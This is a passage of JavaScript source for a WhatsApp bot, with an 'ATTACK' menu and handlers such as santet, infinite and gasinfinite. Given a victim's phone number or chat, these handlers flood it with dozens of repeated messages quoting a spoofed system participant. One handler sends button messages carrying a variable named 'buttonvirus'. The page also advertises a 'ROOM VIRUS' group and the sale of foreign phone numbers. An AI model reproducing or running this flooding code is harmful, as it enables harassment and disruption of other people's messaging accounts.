│➳ ${prefix}𝚜𝚊𝚗𝚝𝚎𝚝𝚝𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚒𝚗𝚏𝚒𝚗𝚒𝚝𝚎𝚝𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚝𝚎𝚗𝚐𝚔𝚘𝚛𝚊𝚔𝚝𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝> 
╰━═════════════━•

╭━═════════════━• 
│  〘 ATTACK2 MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚐𝚊𝚜𝚟𝚗 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚐𝚊𝚜𝚖𝚘𝚖𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚐𝚊𝚜𝚜𝚝𝚒𝚔 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚐𝚊𝚜𝚑𝚎𝚕𝚕𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚐𝚊𝚜𝚜𝚊𝚗𝚝𝚎𝚝 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚐𝚊𝚜𝚒𝚗𝚏𝚒𝚗𝚒𝚝𝚎 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚐𝚊𝚜𝚝𝚎𝚗𝚐𝚔𝚘𝚛𝚊𝚔 <𝚝𝚊𝚛𝚐𝚎𝚝> 
╰━═════════════━•
jika ada kesalahan saya  minta maaf 🙏

TERIMAKASIH YG UDH SUPPORT 
© N4NH3R0 
`
                let btn = [{
                                urlButton: {
                                    displayText: 'ROOM VIRUS 2013',
                                    url: 'https://chat.whatsapp.com/GOeEeEPPT86AMpvA3Hk25P'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '6283841800798'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'beli nomer luar negri',
                                    id: 'https://wa.me/6283841800798?text=bang+beli+nomer'
                                }
                            }]
                         let setbot = db.data.settings[botNumber]
                        if (setbot.templateImage) {
                        hisoka.send5ButImg(m.chat, anu, hisoka.user.name, global.thumb, btn)
                        } else if (setbot.templateGif) {
                        hisoka.send5ButGif(m.chat, anu, hisoka.user.name, global.visoka, btn)
                        } else if (setbot.templateVid) {
                        hisoka.send5ButVid(m.chat, anu, hisoka.user.name, global.visoka, btn)
                        } else if (setbot.templateMsg) {
                        hisoka.send5ButMsg(m.chat, anu, hisoka.user.name, btn)
                        }
   hey = fs.readFileSync('NISSAtiara.mp3')
 hisoka.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: m})
                     }
            break
        case 'thefour': {         
          if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
           asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🇹 🇭 🇪 🇫 🇴 🇺 🇷`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            hisoka.sendMessage(m.chat, {text:"🇹 🇭 🇪 🇫 🇴 🇺 🇷"},{quoted:asukonyol11})
            }
            }
            break
                case 'butto':
                    if (!isCreator) return
                    if (!text) throw `Nomernya mana?`
                 buttonspc = [
                          {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
]
                      
                    buttonMessagepc = {
                          text: "JOMBLO",
                          footerText: 'JONES',
                          buttons: buttonspc,
                          headerType: 1
                      }
                      hisoka.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
                      m.reply(`succes`)
                    break
           case 'santetto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
        case 'gassantet': {          
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
         case 'santet':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT SANTET`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            m.reply(`BERHASIL MENGIRIM SANTET`)
            break
                    case 'infinite':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            break
            case 'infiniteto':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            m.reply(`SUCCES`)
            break
                   case 'gasinfinite':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"THE JO BOT INFINITE"},{quoted:asukonyol11})
            break
          case 'momo': {            
          if (!isCreator) return
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
